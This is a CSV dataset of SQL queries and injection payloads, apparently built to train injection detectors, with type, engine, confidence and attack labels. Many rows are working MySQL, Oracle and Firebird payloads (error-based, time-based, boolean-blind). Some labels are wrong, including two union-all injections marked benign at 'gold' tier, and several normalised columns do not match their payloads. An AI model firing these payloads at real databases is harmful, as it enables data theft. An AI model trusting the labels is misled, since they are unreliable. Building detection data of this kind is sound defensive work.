payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack,source,tier
SELECT * FROM wp_posts LEFT JOIN wp_postmeta ON ( wp_posts.ID = wp_postmeta.post_id ) WHERE ( post_type = 'page' AND post_status = 'publish' ) AND wp_postmeta.meta_key = '_wp_page_template' AND wp_postmeta.meta_value = 'template/reset_password.php' ORDER BY wp_posts.post_title ASC,select * from __IDENT__ left join __IDENT__ on ( __IDENT__ = __IDENT__ ) where ( __IDENT__ = __STR__ and __IDENT__ = __STR__ ) and __IDENT__ = __STR__ and __IDENT__ = __STR__ order by __IDENT__ asc,benign,mysql,0.9,False,original,silver
SELECT * FROM Customers WHERE ( CustomerName LIKE 'L%' OR CustomerName LIKE 'R%' OR CustomerName LIKE 'W%' ) AND Country = 'USA' ORDER BY CustomerName,select * from __IDENT__ where ( __IDENT__ like __STR__ or __IDENT__ like __STR__ or __IDENT__ like __STR__ ) and __IDENT__ = __STR__ order by __IDENT__,benign,generic,1.0,False,original,gold
"1' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'iwkg' = 'iwkg",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,mysql,0.9,True,original,silver
SELECT form ( s ) FROM grown,select __IDENT__ ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
1' ) where 5145 = 5145,__INT__ ) where __INT__ = __INT__,boolean_blind,generic,0.8,True,original,silver
"INSERT INTO prize ( low, opinion, action, division, though, taken ) VALUES ( 'order', 'spider'. dust', 'fort', 'view', 'factor', 'bigger' )","insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ . __IDENT__ __STR__ __IDENT__ __STR__ view __STR__ __IDENT__ __STR__ __IDENT__ )",benign,generic,1.0,False,original,gold
"1"" rlike sleep ( 5 ) and ""rylv"" like ""rylv",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,time_blind,mysql,0.7,True,original,bronze
53238791r,__IDENT__,benign,generic,0.9,False,original,silver
8.7027E+15,__IDENT__ + __INT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-6190\' ) where 2621 = 2621 and username = ""1"" or username = ""1\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.9,True,original,silver
SELECT quite ( s ) FROM tip UNION,select __IDENT__ ( __IDENT__ ) from __IDENT__ union,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-3978 and username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'qbvz\' = \'qbvz""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,oracle,0.9,True,original,silver
corbo gornes,__IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
SELECT * FROM ( SELECT flew FROM essential ),select * from ( select __IDENT__ from __IDENT__ ),benign,generic,1.0,False,original,gold
1 and 6802 = 3592--,__INT__ and __INT__ = __INT__ - -,boolean_blind,generic,0.8,True,original,silver
"-5776%' union all select 3075,3075,3075,3075,3075--","- __INT__ % ' union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ - -",benign,generic,1.0,False,original,gold
"SELECT stop AS given, before AS [knowledge] FROM train","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False,original,gold
"1'+ ( select lang where 4191 = 4191 union all select null,null#","__INT__ + ( select __IDENT__ where __INT__ = __INT__ union all select null , null",benign,generic,1.0,False,original,gold
"1%"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ""%"" = """,__INT__ % __STR__ % __STR__,error_based,mysql,0.85,True,original,silver
select sleep ( 5 ) and ( ( 3404 = 3404,select sleep ( __INT__ ) and ( ( __INT__ = __INT__,time_blind,generic,0.9,True,original,silver
"1 ) as rsyw where 4857 = 4857 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --","__INT__ ) as __IDENT__ where __INT__ = __INT__ or ( select __INT__ * ( if ( ( select * from ( select concat ( __HEX__ , ( select ( __IDENT__ ( __INT__ = __INT__ , __INT__ ) ) ) , __HEX__ , __HEX__ ) ) __IDENT__ ) , __INT__ , __INT__ ) ) ) - -",boolean_blind,mysql,0.7,True,original,bronze
"select dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 70 ) ||chr ( 106 ) ||chr ( 78 ) ,5 ) from dual--","select __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) , __INT__ ) from dual - -",time_blind,oracle,0.9,True,original,silver
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( 'vjdk' like 'vjdk","select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ and ( ( __STR__ like __IDENT__",heavy_query,firebird,0.7,True,original,bronze
"1%"" ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ""%"" = """,__INT__ % __STR__ % __STR__,error_based,mysql,0.9,True,original,silver
9.17827E+015,__IDENT__ + __INT__,benign,generic,1.0,False,original,gold
SELECT * FROM courage WHERE method = 'tobacco' AND ( wonderful = 'tool' OR best = 'laid' ),select * from __IDENT__ where __IDENT__ = __STR__ and ( __IDENT__ = __STR__ or __IDENT__ = __STR__ ),benign,generic,1.0,False,original,gold
"SELECT * FROM smoke WHERE organization BETWEEN ""its"" AND ""leave""",select * from __IDENT__ where __IDENT__ between __STR__ and __STR__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""1 ) as nbno where 9816 = 9816",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ ) as __IDENT__ where __INT__ = __INT__,boolean_blind,oracle,0.8,True,original,silver
